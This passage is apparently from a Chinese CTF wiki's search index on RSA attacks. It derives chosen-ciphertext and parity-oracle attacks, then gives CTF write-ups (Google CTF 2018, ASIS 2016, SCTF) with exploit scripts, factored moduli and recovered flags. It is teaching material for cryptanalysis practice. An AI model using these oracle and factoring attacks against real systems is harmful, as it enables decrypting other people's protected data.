\u8ba1\u7b97 Y=C \\times X^e \\bmod n Y=C \\times X^e \\bmod n \u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u9009\u62e9\u5bc6\u6587\u653b\u51fb\uff0c\u90a3\u4e48\u6211\u4eec\u6c42\u5f97 Y \u5bf9\u5e94\u7684\u89e3\u5bc6\u7ed3\u679c Z=Y^d Z=Y^d \u90a3\u4e48\uff0c\u7531\u4e8e Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= P X\\bmod n Z=Y^d=(C \\times X^e)^d=C^d X=P^{ed} X= P X\\bmod n \uff0c\u7531\u4e8e X \u4e0e N \u4e92\u7d20\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u6c42\u5f97\u76f8\u5e94\u7684\u9006\u5143\uff0c\u8fdb\u800c\u53ef\u4ee5\u5f97\u5230 P","title":"\u4efb\u610f\u5bc6\u6587\u89e3\u5bc6"},{"location":"crypto/asymmetric/rsa/rsa_chosen_cipher/#rsa-parity-oracle","text":"","title":"RSA parity oracle"},{"location":"crypto/asymmetric/rsa/rsa_chosen_cipher/#_2","text":"\u5047\u8bbe\u76ee\u524d\u5b58\u5728\u4e00\u4e2a Oracle\uff0c\u5b83\u4f1a\u5bf9\u4e00\u4e2a\u7ed9\u5b9a\u7684\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u4e14\u4f1a\u68c0\u67e5\u89e3\u5bc6\u7684\u660e\u6587\u7684\u5947\u5076\u6027\uff0c\u5e76\u6839\u636e\u5947\u5076\u6027\u8fd4\u56de\u76f8\u5e94\u7684\u503c\uff0c\u6bd4\u5982 1 \u8868\u793a\u5947\u6570\uff0c0 \u8868\u793a\u5076\u6570\u3002\u90a3\u4e48\u7ed9\u5b9a\u4e00\u4e2a\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\uff0c\u6211\u4eec\u53ea\u9700\u8981 log(N) \u6b21\u5c31\u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\u6d88\u606f\uff0c\u539f\u7406\u5982\u4e0b \u5047\u8bbe C=P^e \\bmod N C=P^e \\bmod N \u7b2c\u4e00\u6b21\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed9\u670d\u52a1\u5668\u53d1\u9001 C*2^e=(2P)^e \\bmod N C*2^e=(2P)^e \\bmod N \u670d\u52a1\u5668\u4f1a\u8ba1\u7b97\u5f97\u5230 2P \\bmod N 2P \\bmod N \u8fd9\u91cc 2P \u662f\u5076\u6570\uff0c\u5b83\u7684\u5e42\u6b21\u4e5f\u662f\u5076\u6570\u3002 N \u662f\u5947\u6570\uff0c\u56e0\u4e3a\u5b83\u662f\u7531\u4e24\u4e2a\u5927\u7d20\u6570\u76f8\u4e58\u5f97\u5230\u3002 \u90a3\u4e48 \u670d\u52a1\u5668\u8fd4\u56de\u5947\u6570\uff0c\u5373 2P \\bmod N 2P \\bmod N \u4e3a\u5947\u6570\uff0c\u5219\u8bf4\u660e 2P \u5927\u4e8e N\uff0c\u4e14\u51cf\u53bb\u4e86\u5947\u6570\u4e2a N\uff0c\u53c8\u56e0\u4e3a 2P<2N 2P<2N \uff0c\u56e0\u6b64\u51cf\u53bb\u4e86\u4e00\u4e2aN\uff0c \u5373 \\frac{N}{2} \\leq P < N \\frac{N}{2} \\leq P < N \uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u8003\u8651\u5411\u4e0b\u53d6\u6574\u3002 \u670d\u52a1\u5668\u8fd4\u56de\u5076\u6570\uff0c\u5219\u8bf4\u660e 2P \u5c0f\u4e8e N\u3002\u5373 0\\leq P < \\frac{N}{2} 0\\leq P < \\frac{N}{2} \uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u5411\u4e0b\u53d6\u6574\u3002 \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u6570\u5b66\u5f52\u7eb3\u6cd5\uff0c\u5373\u5047\u8bbe\u5728\u7b2c i \u6b21\u65f6\uff0c \\frac{xN}{2^{i}} \\leq P < \\frac{xN+N}{2^{i}} \\frac{xN}{2^{i}} \\leq P < \\frac{xN+N}{2^{i}} \u8fdb\u4e00\u6b65\uff0c\u5728\u7b2c i+1 \u6b21\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u9001 C*2^{(i+1)e} C*2^{(i+1)e} \u670d\u52a1\u5668\u4f1a\u8ba1\u7b97\u5f97\u5230 2^{i+1}P \\bmod N=2^{i+1}P-kN 2^{i+1}P \\bmod N=2^{i+1}P-kN 0 \\leq 2^{i+1}P-kN<N 0 \\leq 2^{i+1}P-kN<N \\frac{kN}{2^{i+1}} \\leq P < \\frac{kN+N}{2^{i+1}} \\frac{kN}{2^{i+1}} \\leq P < \\frac{kN+N}{2^{i+1}} \u6839\u636e\u7b2c i \u6b21\u7684\u7ed3\u679c \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+2N}{2^{i+1}} \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+2N}{2^{i+1}} \u90a3\u4e48 \u670d\u52a1\u5668\u8fd4\u56de\u5947\u6570\uff0c\u5219 k \u5fc5\u7136\u662f\u4e00\u4e2a\u5947\u6570\uff0ck=2y+1\uff0c \u90a3\u4e48 \\frac{2yN+N}{2^{i+1}} \\leq P < \\frac{2yN+2N}{2^{i+1}} \\frac{2yN+N}{2^{i+1}} \\leq P < \\frac{2yN+2N}{2^{i+1}} \u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8e P \u5fc5\u7136\u5b58\u5728\uff0c\u6240\u4ee5\u7b2c i+1 \u5f97\u5230\u7684\u8fd9\u4e2a\u8303\u56f4\u548c\u7b2c i \u6b21\u5f97\u5230\u7684\u8303\u56f4\u5fc5\u7136\u5b58\u5728\u4ea4\u96c6\u3002\u6240\u4ee5 y \u5fc5\u7136\u4e0e x \u76f8\u7b49\u3002 \u670d\u52a1\u5668\u8fd4\u56de\u5076\u6570\uff0c\u5219 k \u5fc5\u7136\u662f\u4e00\u4e2a\u5076\u6570\uff0ck=2y\uff0c\u6b64\u65f6 y \u5fc5\u7136\u4e5f\u4e0e x \u76f8\u7b49\uff0c\u90a3\u4e48 \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+N}{2^{i+1}} \\frac{2xN}{2^{i+1}} \\leq P < \\frac{2xN+N}{2^{i+1}} \u8fdb\u4e00\u6b65\u6211\u4eec\u53ef\u4ee5\u8fd9\u4e48\u5f52\u7eb3 lb = 0 ub = N if server returns 1 lb = ( lb + ub ) / 2 else : ub = ( lb + ub ) / 2 \u8fd9\u91cc\u867d\u7136\u662f\u6574\u9664\uff0c \u5373\u4e0b\u53d6\u6574\uff0c\u4f46\u662f\u65e0\u6240\u8c13\u6211\u4eec\u5728\u6700\u521d\u65f6\u5df2\u7ecf\u5206\u6790\u4e86\u8fd9\u4e2a\u95ee\u9898\u3002","title":"\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_chosen_cipher/#2018-google-ctf-perfect-secrecy","text":"\u8fd9\u91cc\u4ee5 2018 \u5e74 Google CTF \u7684\u9898\u76ee\u4e3a\u4f8b\u8fdb\u884c\u5206\u6790 #!/usr/bin/env python3 import sys import random from cryptography.hazmat.primitives import serialization from cryptography.hazmat.backends import default_backend def ReadPrivateKey ( filename ): return serialization . load_pem_private_key ( open ( filename , 'rb' ) . read (), password = None , backend = default_backend ()) def RsaDecrypt ( private_key , ciphertext ): assert ( len ( ciphertext ) <= ( private_key . public_key () . key_size // 8 )), 'Ciphertext too large' return pow ( int . from_bytes ( ciphertext , 'big' ), private_key . private_numbers () . d , private_key . public_key () . public_numbers () . n ) def Challenge ( private_key , reader , writer ): try : m0 = reader . read ( 1 ) m1 = reader . read ( 1 ) ciphertext = reader . read ( private_key . public_key () . key_size // 8 ) dice = RsaDecrypt ( private_key , ciphertext ) for rounds in range ( 100 ): p = [ m0 , m1 ][ dice & 1 ] k = random . randint ( 0 , 2 ) c = ( ord ( p ) + k ) % 2 writer . write ( bytes (( c ,))) writer . flush () return 0 except Exception as e : return 1 def main (): private_key = ReadPrivateKey ( sys . argv [ 1 ]) return Challenge ( private_key , sys . stdin . buffer , sys . stdout . buffer ) if __name__ == '__main__' : sys . exit ( main ()) \u53ef\u4ee5\u770b\u51fa \u6211\u4eec\u53ef\u4ee5\u7ed9\u670d\u52a1\u5668\u4e24\u4e2a\u6570\uff0c\u670d\u52a1\u5668\u4f1a\u6839\u636e\u89e3\u5bc6\u540e\u7684\u5bc6\u6587\u5185\u5bb9\u6765\u51b3\u5b9a\u4f7f\u7528\u54ea\u4e00\u4e2a\u3002 \u670d\u52a1\u5668\u4f1a\u4f7f\u7528 random.randint(0, 2) \u6765\u751f\u6210\u968f\u673a\u6570\uff0c\u5e76\u8f93\u51fa\u76f8\u5173\u7684\u968f\u673a 01 \u5b57\u8282 c\u3002 \u4e4d\u4e00\u770b\uff0c\u4f3c\u4e4e\u662f\u5b8c\u5168\u968f\u673a\u7684\uff0c\u4ed4\u7ec6\u67e5\u4e00\u4e0b random.randint(0, 2) \u53ef\u4ee5\u77e5\u9053\u5176\u751f\u6210\u968f\u673a\u6570\u662f\u5305\u62ec\u8fb9\u754c\u7684\uff0c\u56e0\u6b64\u5176\u751f\u6210\u5076\u6570\u7684\u6982\u7387\u5927\u4e8e\u751f\u6210\u5947\u6570\u7684\u6982\u7387\uff0c\u90a3\u4e48 c \u4e0e p \u540c\u5947\u5076\u7684\u6982\u7387\u4e3a \u2154\u3002\u8fdb\u800c\u6211\u4eec\u901a\u8fc7\u8bbe\u7f6e m0 \u548c m1 \u5c31\u53ef\u4ee5\u77e5\u9053\u89e3\u5bc6\u540e\u7684\u5bc6\u6587\u7684\u6700\u540e\u4e00\u4f4d\u662f 0 \u8fd8\u662f 1 \u3002\u8fd9\u5176\u5b9e\u5c31\u662f RSA parity oracle\u3002 exp \u5982\u4e0b import gmpy2 from pwn import * encflag = open ( './flag.txt' ) . read () encflag = encflag . encode ( 'hex' ) encflag = int ( encflag , 16 ) #context.log_level = 'debug' m = [ ' \\x00 ' , ' \\x07 ' ] n = 0xDA53A899D5573091AF6CC9C9A9FC315F76402C8970BBB1986BFE8E29CED12D0ADF61B21D6C281CCBF2EFED79AA7DD23A2776B03503B1AF354E35BF58C91DB7D7C62F6B92C918C90B68859C77CAE9FDB314F82490A0D6B50C5DC85F5C92A6FDF19716AC8451EFE8BBDF488AE098A7C76ADD2599F2CA642073AFA20D143AF403D1 e = 65537 flag = \"\" def guessvalue ( cnt ): if cnt [ 0 ] > cnt [ 1 ]: return 0 return 1 i = 0 while True : cnt = dict () cnt [ 0 ] = cnt [ 1 ] = 0 p = remote ( 'perfect-secrecy.ctfcompetition.com' , 1337 ) p . send ( m [ 0 ]) p . send ( m [ 1 ]) tmp = pow ( 2 , i ) two_inv = gmpy2 . invert ( tmp , n ) two_cipher = gmpy2 . powmod ( two_inv , e , n ) tmp = encflag * two_cipher % n tmp = hex ( tmp )[ 2 :] . strip ( 'L' ) tmp = '0' * ( 256 - len ( tmp )) + tmp tmp = tmp . decode ( 'hex' ) assert ( len ( tmp ) == 128 ) p . send ( tmp ) #print tmp data = \"\" while ( len ( data ) != 100 ): data += p . recv () for c in data : cnt [ u8 ( c )] += 1 p . close () flag = str ( guessvalue ( cnt )) + flag print i , flag i += 1 \u7ed3\u679c\u5982\u4e0bu89e3\u7801\u540e\u5c31\u53ef\u4ee5\u5f97\u5230 flag CTF { h3ll0__17_5_m3_1_w45_w0nd3r1n6_1f_4f73r_4ll_7h353_y34r5_y0u_d_l1k3_70_m337 }","title":"2018 Google CTF Perfect Secrecy"},{"location":"crypto/asymmetric/rsa/rsa_chosen_cipher/#_3","text":"2016 Plaid CTF rabit 2016 sharif CTF lsb-oracle-150 2018 Backdoor CTF BIT-LEAKER 2018 XMAN \u9009\u62d4\u8d5b baby RSA","title":"\u9898\u76ee"},{"location":"crypto/asymmetric/rsa/rsa_chosen_cipher/#_4","text":"https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack","title":"\u53c2\u8003"},{"location":"crypto/asymmetric/rsa/rsa_complex/","text":"RSA \u590d\u6742\u9898\u76ee \u00b6 2016 ASIS Find the flag \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 ASIS 2016 \u7ebf\u4e0a\u8d5b\u4e2d Find the flag \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u6587\u4ef6\u89e3\u538b\u51fa\u6765\uff0c\u6709\u4e00\u4e2a\u5bc6\u6587\uff0c\u4e00\u4e2a\u516c\u94a5\uff0c\u4e00\u4e2a py \u811a\u672c\u3002\u770b\u4e00\u4e0b\u516c\u94a5\u3002 \u279c RSA openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 256 bit ) Modulus: 00 :d8:e2:4c:12:b7:b9:9e:fe:0a:9b:c0:4a:6a:3d: f5:8a:2a:94:42:69:b4:92:b7:37:6d:f1:29:02:3f: 20 :61:b9 Exponent: 12405943493775545863 ( 0xac2ac3e0ca0f5607 ) Modulus = D8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9 \u8fd9\u4e48\u5c0f\u7684\u4e00\u4e2a N N \uff0c\u5148\u5206\u89e3\u4e00\u4e0b\u3002 p = 311155972145869391293781528370734636009 q = 315274063651866931016337573625089033553 \u518d\u770b\u7ed9\u7684 py \u811a\u672c\u3002 #!/usr/bin/python import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 flag = open ( 'flag' , 'r' ) . read () * 30 def ext_rsa_encrypt ( p , q , e , msg ): m = bytes_to_long ( msg ) while True : n = p * q try : phi = ( p - 1 ) * ( q - 1 ) d = gmpy . invert ( e , phi ) pubkey = RSA . construct (( long ( n ), long ( e ))) key = PKCS1_v1_5 . new ( pubkey ) enc = key . encrypt ( msg ) . encode ( 'base64' ) return enc except : p = gmpy . next_prime ( p ** 2 + q ** 2 ) q = gmpy . next_prime ( 2 * p * q ) e = gmpy . next_prime ( e ** 2 ) p = getPrime ( 128 ) q = getPrime ( 128 ) n = p * q e = getPrime ( 64 ) pubkey = RSA . construct (( long ( n ), long ( e ))) f = open ( 'pubkey.pem' , 'w' ) f . write ( pubkey . exportKey ()) g = open ( 'flag.enc' , 'w' ) g . write ( ext_rsa_encrypt ( p , q , e , flag )) \u903b\u8f91\u5f88\u7b80\u5355\uff0c\u8bfb\u53d6 flag\uff0c\u91cd\u590d 30 \u904d\u4e3a\u5bc6\u6587\u3002\u968f\u673a\u53d6 p p \u548c q q \uff0c\u751f\u6210\u4e00\u4e2a\u516c\u94a5\uff0c\u5199\u5165 pubkey.pem \uff0c\u518d\u7528\u811a\u672c\u4e2d\u7684 ext_rsa_encrypt \u51fd\u6570\u8fdb\u884c\u52a0\u5bc6\uff0c\u6700\u540e\u5c06\u5bc6\u6587\u5199\u5165 flag.enc \u3002 \u5c1d\u8bd5\u4e00\u4e0b\u89e3\u5bc6\uff0c\u63d0\u793a\u5bc6\u6587\u8fc7\u957f\uff0c\u518d\u770b\u52a0\u5bc6\u51fd\u6570\uff0c\u539f\u6765\u5f53\u52a0\u5bc6\u5931\u8d25\u65f6\uff0c\u51fd\u6570\u4f1a\u8df3\u5230\u5f02\u5e38\u5904\u7406\uff0c\u4ee5\u4e00\u5b9a\u7b97\u6cd5\u91cd\u65b0\u53d6\u66f4\u5927\u7684 p p \u548c q q \uff0c\u76f4\u5230\u52a0\u5bc6\u6210\u529f\u3002 \u90a3\u4e48\u6211\u4eec\u53ea\u8981\u4e5f\u5199\u4e00\u4e2a\u76f8\u5e94\u7684\u89e3\u5bc6\u51fd\u6570\u5373\u53ef\u3002 #!/usr/bin/python import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 def ext_rsa_decrypt ( p , q , e , msg ): m = bytes_to_long ( msg ) while True : n = p * q try : phi = ( p - 1 ) * ( q - 1 ) d = gmpy . invert ( e , phi ) privatekey = RSA . construct (( long ( n ), long ( e ), long ( d ), long ( p ), long ( q ))) key = PKCS1_v1_5 . new ( privatekey ) de_error = '' enc = key . decrypt ( msg . decode ( 'base64' ), de_error ) return enc except Exception as error : print error p = gmpy . next_prime ( p ** 2 + q ** 2 ) q = gmpy . next_prime ( 2 * p * q ) e = gmpy . next_prime ( e ** 2 ) p = 311155972145869391293781528370734636009 q = 315274063651866931016337573625089033553 n = p * q e = 12405943493775545863 # pubkey = RSA.construct((long(n), long(e))) # f = open('pubkey.pem', 'w') # f.write(pubkey.exportKey()) g = open ( 'flag.enc' , 'r' ) msg = g . read () flag = ext_rsa_decrypt ( p , q , e , msg ) print flag \u62ff\u5230 flag ASIS{F4ct0R__N_by_it3rat!ng!} SCTF RSA1 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA1 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9996\u5148\u89e3\u538b\u538b\u7f29\u5305\u540e\uff0c\u5f97\u5230\u5982\u4e0b\u6587\u4ef6 \u279c level0 git: ( master ) \u2717 ls -al \u603b\u7528\u91cf 4 drwxrwxrwx 1 root root 0 7\u6708 30 16 :36 . drwxrwxrwx 1 root root 0 7\u6708 30 16 :34 .. -rwxrwxrwx 1 root root 349 5\u6708 2 2016 level1.passwd.enc -rwxrwxrwx 1 root root 2337 5\u6708 6 2016 level1.zip -rwxrwxrwx 1 root root 451 5\u6708 2 2016 public.key \u5c1d\u8bd5\u89e3\u538b\u7f29\u4e86\u4e00\u4e0b level1.zip \u73b0\u9700\u8981\u5bc6\u7801\u3002\u7136\u540e\u6839\u636e level1.passwd.enc \u53ef\u77e5\uff0c\u5e94\u8be5\u662f\u6211\u4eec\u9700\u8981\u89e3\u5bc6\u8fd9\u4e2a\u6587\u4ef6\u624d\u80fd\u5f97\u5230\u5bf9\u5e94\u7684\u5bc6\u7801\u3002\u67e5\u770b\u516c\u94a5 \u279c level0 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 2048 bit ) Modulus: 00 :94:a0:3e:6e:0e:dc:f2:74:10:52:ef:1e:ea:a8: 89 :d6:f9:8d:01:11:51:db:5e:90:92:48:fd:39:0c: 70 :87:24:d8:98:3c:f3:33:1c:ba:c5:61:c2:ce:2c: 5a:f1:5e:65:b2:b2:46:91:56:b6:19:d5:d3:b2:a6: bb:a3:7d:56:93:99:4d:7e:4c:2f:aa:60:7b:3e:c8: fc:90:b2:00:62:4b:53:18:5b:a2:30:10:60:a8:21: ab:61:57:d7:e7:cc:67:1b:4d:cd:66:4c:7d:f1:1a: 2a:1d:5e:50:80:c1:5e:45:12:3a:ba:4a:53:64:d8: 72 :1f:84:4a:ae:5c:55:02:e8:8e:56:4d:38:70:a5: 16 :36:d3:bc:14:3e:2f:ae:2f:31:58:ba:00:ab:ac: c0:c5:ba:44:3c:29:70:56:01:6b:57:f5:d7:52:d7: 31 :56:0b:ab:0a:e6:8d:ad:08:22:a9:1f:cb:6e:49: cc:01:4c:12:d2:ab:a3:a5:97:e5:10:49:19:7f:69: d9:3b:c5:53:53:71:00:18:60:cc:69:1a:06:64:3b: 86 :94:70:a9:da:82:fc:54:6b:06:23:43:2d:b0:20: eb:b6:1b:91:35:5e:53:a6:e5:d8:9a:84:bb:30:46: b8:9f:63:bc:70:06:2d:59:d8:62:a5:fd:5c:ab:06: 68 :81 Exponent: 65537 ( 0x10001 ) Modulus = 94A03E6E0EDCF2741052EF1EEAA889D6F98D011151DB5E909248FD390C708724D8983CF3331CBAC561C2CE2C5AF15E65B2B2469156B619D5D3B2A6BBA37D5693994D7E4C2FAA607B3EC8FC90B200624B53185BA2301060A821AB6157D7E7CC671B4DCD664C7DF11A2A1D5E5080C15E45123ABA4A5364D8721F844AAE5C5502E88E564D3870A51636D3BC143E2FAE2F3158BA00ABACC0C5BA443C297056016B57F5D752D731560BAB0AE68DAD0822A91FCB6E49CC014C12D2ABA3A597E51049197F69D93BC5535371001860CC691A06643B869470A9DA82FC546B0623432DB020EBB61B91355E53A6E5D89A84BB3046B89F63BC70062D59D862A5FD5CAB066881 writing RSA key -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlKA+bg7c8nQQUu8e6qiJ 1vmNARFR216Qkkj9OQxwhyTYmDzzMxy6xWHCzixa8V5lsrJGkVa2GdXTsqa7o31W k5lNfkwvqmB7Psj8kLIAYktTGFuiMBBgqCGrYVfX58xnG03NZkx98RoqHV5QgMFe RRI6ukpTZNhyH4RKrlxVAuiOVk04cKUWNtO8FD4vri8xWLoAq6zAxbpEPClwVgFr V/XXUtcxVgurCuaNrQgiqR/LbknMAUwS0qujpZflEEkZf2nZO8VTU3EAGGDMaRoG ZDuGlHCp2oL8VGsGI0MtsCDrthuRNV5TpuXYmoS7MEa4n2O8cAYtWdhipf1cqwZo gQIDAQAB -----END PUBLIC KEY----- \u53d1\u73b0\u867d\u7136\u8bf4\u662f 2048 \u4f4d\uff0c\u4f46\u662f\u663e\u7136\u6a21\u6570\u6ca1\u6709\u90a3\u4e48\u957f\uff0c\u5c1d\u8bd5\u5206\u89e3\u4e0b\uff0c\u5f97\u5230 p=250527704258269 q=74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349 \u7136\u540e\u5c31\u53ef\u4ee5\u6784\u9020\uff0c\u5e76\u4e14\u89e3\u5bc6\uff0c\u4ee3\u7801\u5982\u4e0b from Crypto.PublicKey import RSA import gmpy2 from base64 import b64decode p = 250527704258269 q = 74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349 e = 65537 n = p * q def getprivatekey ( n , e , p , q ): phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) priviatekey = RSA . construct (( long ( n ), long ( e ), long ( d ))) with open ( 'private.pem' , 'w' ) as f : f . write ( priviatekey . exportKey ()) def decrypt (): with open ( './level1.passwd.enc' ) as f : cipher = f . read () cipher = b64decode ( cipher ) with open ( './private.pem' ) as f : key = RSA . importKey ( f ) print key . decrypt ( cipher ) #getprivatekey(n, e, p, q) decrypt () \u53d1\u73b0\u4e0d\u5bf9 \u279c level0 git: ( master ) \u2717 python exp.py \u4e00\u5806\u4e71\u7801\u3002\u3002 \u8fd9\u65f6\u5019\u5c31\u8981\u8003\u8651\u5176\u4ed6\u60c5\u51b5\u4e86\uff0c\u4e00\u822c\u6765\u8bf4\u73b0\u5b9e\u4e2d\u5b9e\u73b0\u7684 RSA \u90fd\u4e0d\u4f1a\u76f4\u63a5\u7528\u539f\u751f\u7684 RSA\uff0c\u90fd\u4f1a\u52a0\u4e00\u4e9b\u586b\u5145\u6bd4\u5982 OAEP\uff0c\u6211\u4eec\u8fd9\u91cc\u8bd5\u8bd5\uff0c\u4fee\u6539\u4ee3\u7801 def decrypt1 () : with open ( './level1.passwd.enc' ) as f: cipher = f.read () cipher = b64decode ( cipher ) with open ( './private.pem' ) as f: key = RSA.importKey ( f ) key = PKCS1_OAEP.new ( key ) print key.decrypt ( cipher ) \u679c\u7136\u5982\u6b64\uff0c\u5f97\u5230 \u279c level0 git: ( master ) \u2717 python exp.py FaC5ori1ati0n_aTTA3k_p_tOO_sma11 \u5f97\u5230\u89e3\u538b\u5bc6\u7801\u3002\u7ee7\u7eed\uff0c\u67e5\u770b level1 \u4e2d\u7684\u516c\u94a5 \u279c level1 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 2048 bit ) Modulus: 00 :c3:26:59:69:e1:ed:74:d2:e0:b4:9a:d5:6a:7c: 2f:2a:9e:c3:71:ff:13:4b:10:37:c0:6f:56:19:34: c5:cb:1f:6d:c0:e3:57:3b:47:c4:76:3e:21:a3:b0: 11 :11:78:d4:ee:4f:e8:99:2b:15:cb:cb:d7:73:e4: f9:a6:28:20:fd:db:8c:ea:16:ed:67:c2:48:12:6e: 4b:01:53:4a:67:cb:22:23:3b:34:2e:af:13:ef:93: 45 :16:2b:00:9f:e0:4b:d1:90:c9:2c:27:9a:34:c3: 3f:d7:ee:40:f5:82:50:39:aa:8c:e9:c2:7b:f4:36: e3:38:9d:04:50:db:a9:b7:3f:4b:2a:d6:8a:2a:5c: 87 :2a:eb:74:35:98:6a:9c:e4:52:cb:93:78:d2:da: 39 :83:f3:0c:d1:65:1e:66:9c:40:56:06:0d:58:fc: 41 :64:5e:06:da:83:d0:3b:06:42:70:da:38:53:e0: 54 :35:53:ce:de:79:4a:bf:f5:3b:e5:53:7f:6c:18: 12 :67:a9:de:37:7d:44:65:5e:68:0a:78:39:3d:bb: 00 :22:35:0e:a3:94:e6:94:15:1a:3d:39:c7:50:0e: b1:64:a5:29:a3:69:41:40:69:94:b0:0d:1a:ea:9a: 12 :27:50:ee:1e:3a:19:b7:29:70:b4:6d:1e:9d:61: 3e:7d Exponent: 65537 ( 0x10001 ) Modulus = C3265969E1ED74D2E0B49AD56A7C2F2A9EC371FF134B1037C06F561934C5CB1F6DC0E3573B47C4763E21A3B0111178D4EE4FE8992B15CBCBD773E4F9A62820FDDB8CEA16ED67C248126E4B01534A67CB22233B342EAF13EF9345162B009FE04BD190C92C279A34C33FD7EE40F5825039AA8CE9C27BF436E3389D0450DBA9B73F4B2AD68A2A5C872AEB7435986A9CE452CB9378D2DA3983F30CD1651E669C4056060D58FC41645E06DA83D03B064270DA3853E0543553CEDE794ABFF53BE5537F6C181267A9DE377D44655E680A78393DBB0022350EA394E694151A3D39C7500EB164A529A36941406994B00D1AEA9A122750EE1E3A19B72970B46D1E9D613E7D writing RSA key -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwyZZaeHtdNLgtJrVanwv Kp7Dcf8TSxA3wG9WGTTFyx9twONXO0fEdj4ho7AREXjU7k/omSsVy8vXc+T5pigg /duM6hbtZ8JIEm5LAVNKZ8siIzs0Lq8T75NFFisAn+BL0ZDJLCeaNMM/1+5A9YJQ OaqM6cJ79DbjOJ0EUNuptz9LKtaKKlyHKut0NZhqnORSy5N40to5g/MM0WUeZpxA VgYNWPxBZF4G2oPQOwZCcNo4U+BUNVPO3nlKv/U75VN/bBgSZ6neN31EZV5oCng5 PbsAIjUOo5TmlBUaPTnHUA6xZKUpo2lBQGmUsA0a6poSJ1DuHjoZtylwtG0enWE+ fQIDAQAB -----END PUBLIC KEY----- \u4f3c\u4e4e\u8fd8\u662f\u4e0d\u662f\u5f88\u5927\uff0c\u518d\u6b21\u5206\u89e3\uff0c\u7136\u540e\u8bd5\u4e86 factordb \u4e0d\u884c\uff0c\u8bd5\u8bd5 yafu\u3002\u7ed3\u679c\u5206\u89e3\u51fa\u6765\u4e86\u3002 P309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496383 P309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496259 \u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e24\u4e2a\u6570\u975e\u5e38\u76f8\u8fd1\uff0c\u53ef\u80fd\u662f factordb \u6ca1\u6709\u5b9e\u73b0\u8fd9\u7c7b\u5206\u89e3\u3002 \u7ee7\u800c\u4e0b\u9762\u7684\u64cd\u4f5c\u7c7b\u4f3c\u4e8e level0\u3002\u53ea\u662f\u8fd9\u6b21\u662f\u76f4\u63a5\u89e3\u5bc6\u5c31\u597d\uff0c\u6ca1\u5565\u586b\u5145\uff0c\u8bd5\u4e86\u586b\u5145\u53cd\u800c\u9519 \u5f97\u5230\u5bc6\u7801 fA35ORI11TLoN_Att1Ck_cL0sE_PrI8e_4acTorS \u3002\u7ee7\u7eed\u4e0b\u4e00\u6b65\uff0c\u67e5\u770b\u516c\u94a5 \u279c level2 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 1025 bit ) Modulus: 01 :ba:0c:c2:45:b4:5c:e5:b5:f5:6c:d5:ca:a5:90: c2:8d:12:3d:8a:6d:7f:b6:47:37:fb:7c:1f:5a:85: 8c:1e:35:13:8b:57:b2:21:4f:f4:b2:42:24:5f:33: f7:2c:2c:0d:21:c2:4a:d4:c5:f5:09:94:c2:39:9d: 73 :e5:04:a2:66:1d:9c:4b:99:d5:38:44:ab:13:d9: cd:12:a4:d0:16:79:f0:ac:75:f9:a4:ea:a8:7c:32: 16 :9a:17:d7:7d:80:fd:60:29:64:c7:ea:50:30:63: 76 :59:c7:36:5e:98:d2:ea:5b:b3:3a:47:17:08:2d: d5:24:7d:4f:a7:a1:f0:d5:73 Exponent: 01 :00:8e:81:dd:a0:e3:19:28:e8:ee:51:11:08:c7: 